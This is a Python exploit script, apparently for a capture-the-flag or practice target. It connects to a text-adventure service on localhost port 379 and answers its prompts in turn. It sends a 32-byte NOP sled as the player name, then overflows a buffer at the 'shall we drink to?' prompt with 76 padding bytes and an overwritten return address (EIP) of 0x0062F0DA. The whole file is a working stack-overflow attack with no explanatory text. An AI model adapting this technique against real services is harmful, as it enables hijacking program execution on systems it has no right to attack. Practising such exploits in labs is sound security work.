import socket
import struct
import time

s = socket.socket()
s.connect(("localhost", 379))

new_eip = struct.pack("<I", 0x0062F0DA)

nop_sled = b"\x90" * 32

data = s.recv(1024)
decoded = data.decode()

while len(decoded) != 0:
    
    print(decoded)
    
    if decoded.__contains__("Play the game"):
        msg = "1"
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())
    
    if decoded.__contains__("pick a name"):        
        print(f">>> Sending nop_sled\n")
        s.send(nop_sled)

    if decoded.__contains__("Ale, of course!"):
        msg = "1"
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())

    if decoded.__contains__("shall we drink to?"):
        payload = [
            b"A" * 76,
            new_eip,
            b"B" * 4,
            b"C" * 10
        ]
        payload = b"".join(payload)        
        print(f">>> Sending payload\n")
        s.send(payload)

    if decoded.__contains__("shall you do now?"):
        msg = "2"
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())

    try:        
        data = s.recv(1024)
        decoded = data.decode()
        time.sleep(1)
    except:
        data = 0
        decoded = ""

s.close()
